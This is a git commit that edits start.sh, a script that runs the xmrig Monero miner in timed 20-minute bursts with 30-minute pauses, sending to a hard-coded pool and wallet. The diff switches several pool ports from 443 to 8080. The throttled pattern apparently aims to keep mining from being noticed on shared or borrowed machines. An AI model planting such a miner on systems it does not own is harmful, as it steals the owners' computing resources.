090f5112a5d4aa905d9b5990fc2dec9374d1d48c
sudodeku <79855051+sudodeku@users.noreply.github.com>
2021-03-09 09:28:01 +0530

    Update start.sh

--- start.sh
+++ start.sh
@@ -5,11 +5,11 @@ timeout 20m ./xmrig -o pool.supportxmr.com:8080 -u 4AEnYY6Me2r6LGR3GbSvMT7RKwQJS
 sleep 30m
 timeout 20m ./xmrig -o pool.supportxmr.com:8080 -u 4AEnYY6Me2r6LGR3GbSvMT7RKwQJSv4S8jH4uF7vzVXbEwm1hQn6ToJZ75inNe8UFwckFb1sU7knf2izi1dC3sDX8oiZ5Ej -k --tls -p minerA &
 sleep 30m
-timeout 20m ./xmrig -o pool.supportxmr.com:443 -u 4AEnYY6Me2r6LGR3GbSvMT7RKwQJSv4S8jH4uF7vzVXbEwm1hQn6ToJZ75inNe8UFwckFb1sU7knf2izi1dC3sDX8oiZ5Ej -k --tls -p minerA &
+timeout 20m ./xmrig -o pool.supportxmr.com:8080 -u 4AEnYY6Me2r6LGR3GbSvMT7RKwQJSv4S8jH4uF7vzVXbEwm1hQn6ToJZ75inNe8UFwckFb1sU7knf2izi1dC3sDX8oiZ5Ej -k --tls -p minerA &
 sleep 30m
-timeout 20m ./xmrig -o pool.supportxmr.com:443 -u 4AEnYY6Me2r6LGR3GbSvMT7RKwQJSv4S8jH4uF7vzVXbEwm1hQn6ToJZ75inNe8UFwckFb1sU7knf2izi1dC3sDX8oiZ5Ej -k --tls -p minerA &
+timeout 20m ./xmrig -o pool.supportxmr.com:8080 -u 4AEnYY6Me2r6LGR3GbSvMT7RKwQJSv4S8jH4uF7vzVXbEwm1hQn6ToJZ75inNe8UFwckFb1sU7knf2izi1dC3sDX8oiZ5Ej -k --tls -p minerA &
 sleep 30m
-timeout 20m ./xmrig -o pool.supportxmr.com:443 -u 4AEnYY6Me2r6LGR3GbSvMT7RKwQJSv4S8jH4uF7vzVXbEwm1hQn6ToJZ75inNe8UFwckFb1sU7knf2izi1dC3sDX8oiZ5Ej -k --tls -p minerA &
+timeout 20m ./xmrig -o pool.supportxmr.com:8080 -u 4AEnYY6Me2r6LGR3GbSvMT7RKwQJSv4S8jH4uF7vzVXbEwm1hQn6ToJZ75inNe8UFwckFb1sU7knf2izi1dC3sDX8oiZ5Ej -k --tls -p minerA &
 sleep 30m
 timeout 20m ./xmrig -o pool.supportxmr.com:443 -u 4AEnYY6Me2r6LGR3GbSvMT7RKwQJSv4S8jH4uF7vzVXbEwm1hQn6ToJZ75inNe8UFwckFb1sU7knf2izi1dC3sDX8oiZ5Ej -k --tls -p minerA &
 sleep 30m
